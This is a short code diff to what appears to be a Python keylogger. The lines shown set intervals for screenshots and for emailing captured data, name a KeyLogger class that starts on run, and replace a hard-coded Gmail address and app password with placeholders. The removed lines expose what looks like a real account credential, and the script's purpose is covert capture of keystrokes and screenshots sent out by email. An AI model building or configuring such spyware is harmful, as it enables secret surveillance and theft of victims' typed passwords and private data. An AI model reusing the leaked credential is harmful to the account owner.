@@ -9,8 +9,8 @@ from email import encoders
 import threading
 
 # Configuration
-EMAIL_ADDRESS = "iamsamir2220@gmail.com"  # Use a dedicated account
-EMAIL_PASSWORD = "pxrv sotl lxxc loim "  # Use app-specific password
+EMAIL_ADDRESS = "your email"  # Use a dedicated account
+EMAIL_PASSWORD = "......... "  # Use app-specific password
 SEND_INTERVAL = 5 # Seconds between emails
 SCREENSHOT_INTERVAL = 5
 MAX_SCREENSHOTS = 100# Seconds between screenshots
@@ -131,4 +131,5 @@ class KeyLogger:
 
 if __name__ == "__main__":
     logger = KeyLogger()
+
     logger.start()
